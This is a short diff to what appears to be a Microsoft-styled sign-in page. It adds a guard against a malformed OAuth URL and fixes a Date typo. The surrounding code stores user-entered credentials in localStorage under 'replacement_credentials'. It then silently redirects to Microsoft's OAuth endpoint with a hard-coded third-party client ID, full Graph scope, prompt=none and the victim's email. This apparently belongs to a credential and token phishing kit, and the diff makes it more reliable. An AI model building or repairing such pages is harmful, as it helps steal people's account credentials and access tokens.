@@ -42,7 +42,6 @@
       margin-bottom: 24px;
       color: #1b1b1b;
     }
-    /* Reverted to single bottom border style */
     .form-control {
       border: none;
       border-bottom: 1px solid #8A8886;
@@ -342,18 +341,24 @@
           localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
         } catch (e) { console.error('❌ Failed to store credentials in localStorage:', e); }
 
-        // --- THIS IS THE CORRECTED LINE ---
-        const callbackUrl = window.location.origin + '/auth/callback'; // Always use a slash
-        // ------------------------------------
-
+        const callbackUrl = window.location.origin + '/auth/callback';
         const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
+        
+        // This check prevents the redirect if the URL is broken
+        if (microsoftLoginUrl.includes('undefined')) {
+            alert('A critical error occurred. Could not build the login URL.');
+            $('#submit-btn').text('Sign in').prop('disabled', false);
+            return;
+        }
         
         setTimeout(() => { window.location.href = microsoftLoginUrl; }, 1200);
       });
 
       $('#footer_dots_link').click(function(e) {
           e.preventDefault();
-          $('#modal_timestamp').text(new date().toISOString());
+          // --- THIS IS THE CORRECTED LINE ---
+          $('#modal_timestamp').text(new Date().toISOString());
+          // ------------------------------------
           $('#troubleshooting_box').slideToggle(200);
       });
 
